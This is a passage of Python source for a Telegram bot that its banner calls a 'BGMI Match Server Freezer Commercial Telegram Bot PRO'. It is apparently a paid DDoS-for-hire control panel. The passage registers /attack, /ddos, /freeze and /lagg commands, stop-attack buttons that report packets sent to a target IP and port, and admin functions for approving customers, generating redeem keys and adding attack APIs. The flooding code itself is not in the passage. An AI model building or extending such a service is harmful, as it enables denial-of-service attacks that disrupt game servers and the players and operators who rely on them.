                "• `/broadcast <msg>` - Send global announcement\n"
                "• `/reload` - Reload configuration\n"
            )
            await query.message.reply_text(admin_text, parse_mode="Markdown")
        else:
            await query.message.reply_text("❌ *Admin access required!*", parse_mode="Markdown")
    elif data.startswith("stop_attack_"):
        target_uid = int(data.split("stop_attack_")[1])
        if user_id == target_uid or is_admin(user_id):
            if target_uid in active_attacks:
                info = active_attacks[target_uid]
                info["stresser"].stop()
                stats = info["stresser"].get_stats()
                del active_attacks[target_uid]
                await query.edit_message_text(
                    f"🛑 *ATTACK STOPPED BY USER!*\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"🎯 *Target:* `{info['ip']}:{info['port']}`\n"
                    f"📦 *Packets Sent:* `{stats['packets']:,}`\n"
                    f"📊 *Data Transferred:* `{stats['bytes_mb']} MB`",
                    parse_mode="Markdown"
                )
            else:
                await query.message.reply_text("⚠️ *Attack already stopped or expired.*", parse_mode="Markdown")
        else:
            await query.message.reply_text("❌ You can only stop your own attacks!", parse_mode="Markdown")

# Global error handler
async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
    logger.error("Exception while handling an update:", exc_info=context.error)
    if isinstance(context.error, (TimedOut, NetworkError)):
        logger.warning("Telegram network timeout suppressed cleanly.")
        return

def main():
    bot_token = config.get("BOT_TOKEN")
    if not bot_token or bot_token == "YOUR_TELEGRAM_BOT_TOKEN_HERE":
        print("\n=======================================================")
        print("ERROR: Please set your BOT_TOKEN in config.json file!")
        print("=======================================================\n")
        return

    request = HTTPXRequest(
        connection_pool_size=200,
        connect_timeout=35.0,
        read_timeout=35.0,
        write_timeout=35.0,
        pool_timeout=35.0,
    )

    app = Application.builder().token(bot_token).request(request).build()

    # User commands
    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("attack", attack_command))
    app.add_handler(CommandHandler("bgmi", attack_command))
    app.add_handler(CommandHandler("freeze", attack_command))
    app.add_handler(CommandHandler("ddos", attack_command))
    app.add_handler(CommandHandler("ping", attack_command))
    app.add_handler(CommandHandler("lagg", attack_command))
    app.add_handler(CommandHandler("matchfreeze", attack_command))
    app.add_handler(CommandHandler("redeem", redeem_command))
    app.add_handler(CommandHandler("stop", stop_command))
    app.add_handler(CommandHandler("status", status_command))
    app.add_handler(CommandHandler("myinfo", myinfo_command))
    app.add_handler(CommandHandler("profile", myinfo_command))

    # Admin commands
    app.add_handler(CommandHandler("approve", approve_command))
    app.add_handler(CommandHandler("disapprove", disapprove_command))
    app.add_handler(CommandHandler("genkey", genkey_command))
    app.add_handler(CommandHandler("addapi", addapi_command))
    app.add_handler(CommandHandler("apis", apis_command))
    app.add_handler(CommandHandler("removeapi", removeapi_command))
    app.add_handler(CommandHandler("users", users_command))
    app.add_handler(CommandHandler("broadcast", broadcast_command))
    app.add_handler(CommandHandler("reload", reload_command))

    # Callbacks & Errors
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_error_handler(error_handler)

    print("=== BGMI Match Server Freezer Commercial Telegram Bot PRO v5.0 Started! ===")
    print(f"Token: {bot_token[:10]}... | Admin IDs: {config.get('ADMIN_IDS')}")
    print("Press Ctrl+C to stop.")
    app.run_polling(drop_pending_updates=True, poll_interval=1.0)

if __name__ == "__main__":
    main()
